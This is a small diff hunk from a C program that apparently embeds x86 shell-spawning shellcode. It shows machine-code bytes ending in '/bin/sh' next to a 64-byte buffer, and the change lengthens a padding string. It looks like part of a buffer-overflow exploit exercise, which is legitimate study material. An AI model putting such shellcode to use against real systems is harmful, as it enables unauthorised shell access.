@@ -14,7 +14,7 @@ int main(char* argv[], int argc) {
 	"\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
 	"\xff\xff\xff"
 	"/bin/sh"
-	"bbb"
+	"bbbbbbb"
 	"\x00\x00\x00\x00\x00\x00";
 	
 	char buff[64];
